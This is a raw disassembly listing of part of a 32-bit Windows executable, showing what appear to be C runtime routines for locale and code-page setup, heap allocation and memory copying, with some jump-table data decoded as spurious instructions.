  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
